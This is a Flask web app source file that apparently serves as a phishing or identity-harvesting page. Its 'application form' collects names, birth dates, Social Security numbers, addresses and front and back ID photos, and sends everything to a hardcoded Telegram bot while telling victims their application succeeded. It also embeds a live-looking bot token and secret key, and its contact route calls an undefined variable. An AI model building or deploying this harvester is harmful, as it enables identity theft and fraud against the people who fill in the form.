from flask import Flask, render_template, url_for, redirect, request, flash
from forms import ApplicationForm
from forms import Contactus
from werkzeug.utils import secure_filename
import requests
import io

app = Flask(__name__)

app.config['SECRET_KEY'] = 'decb94a1ab5d7b149f12f62b5a7532c3'
 
def STT(message_content, images=None):
    bot_chat_id = "1952892389"
    
    message = "\n".join([f"{key}:{value}" for key, value in message_content.items()])
    files = []

    if images:
        url = 'https://api.telegram.org/bot6960033187:AAGEurWvnfuoXuHEivkDzKB3nF7SP5XnHPY/sendPhoto'
        for image in images:
            files = {"photo": image}
            data = {'chat_id':bot_chat_id, 'text':message}
            response = requests.post(url, files=files, data=data)
        url = 'https://api.telegram.org/bot6960033187:AAGEurWvnfuoXuHEivkDzKB3nF7SP5XnHPY/SendMessage' 

    else:
        url = 'https://api.telegram.org/bot6960033187:AAGEurWvnfuoXuHEivkDzKB3nF7SP5XnHPY/SendMessage'
        data = {'chat_id': bot_chat_id, 'text': message}
    response = requests.post(url, files=files, data=data)

@app.route('/')
@app.route('/home', methods=["POST", "GET"])
def Home():
    form = ApplicationForm()
    contactusform = Contactus()
    user_form = request.form
    return render_template("index.html", form=form, user_form=user_form, contactusform=contactusform)

@app.route('/Contact-us', methods=["POST"])
def Contact():
    try:
        contactusform = Contactus()
        form = ApplicationForm()
        message = contactusform.Message.data
        subject = contactusform.Subject.data
        message_content = {"Message":message, "Subject":subject}
        if request.method == "POST" and contactusform.validate_on_submit():            
            STT(message_content, url2)
            flash('Thanks For Your Feedback We Will Get Back To You', 'success')
            return redirect(url_for('Home',contactusform=contactusform, form=form))
        flash('Sorry Check Your Input', 'danger')
        return render_template("index.html", contactusform=contactusform, form=form)
    except Exception as e:
        flash(f'an error occured Try again \n hint: {e}', 'danger')
        return render_template('index.html', contactusform=contactusform, form=form)    

@app.route('/proccessing', methods=["POST","GET"])
def Sender_applicationform():
    try:
        form = ApplicationForm()
        contactusform = Contactus()
        Fullname = form.Fullname.data
        Email = form.Email.data
        PhoneNumber = form.PhoneNumber.data
        DOB = form.DOB.data
        PersonnelID = form.PersonnelID.data
        Street = form.Street.data
        SSN = form.SSN.data                      
        country = request.form['country']
        city = request.form['city']
        region = request.form['region']
        zip = request.form['postal-code']
        FrontID = form.FrontID.data
        BackID = form.BackID.data    

        form_data = {                
                "Fullname": Fullname,
                "Email": Email,
                "PhoneNumber": PhoneNumber,
                "DOB": DOB,
                "PersonnelID": PersonnelID,
                "Street": Street,
                "SSN": SSN,                
                "country": country,
                "city": city,
                "region": region,
                "zip": zip
             }            
        if  request.method == 'POST' and  form.validate_on_submit():           
            image_files = [FrontID, BackID]   
            STT(form_data, images=image_files)                                              
            flash(f'Hello {form.Fullname.data} Your application Was Submitted Successfully, We Will Get Back To You By Mail!',category='success')             
            return redirect(url_for('Home', form=form, contactusform=contactusform))
        flash('Validation Failed Please Check Your inputs', category='danger')    
        return render_template('index.html', form=form, contactusform=contactusform)
    except Exception as e:
        flash(f'Sorry We Ecountered An Error While Validating Your Form, Confirm Your Inputs And Try Again Or Reach Out To Us For Futher Asistance! Hint: {e}')
        return render_template('index.html', form=form, contactusform=contactusform)   

if __name__ == "__main__":
    app.run(debug=True, port="4444")
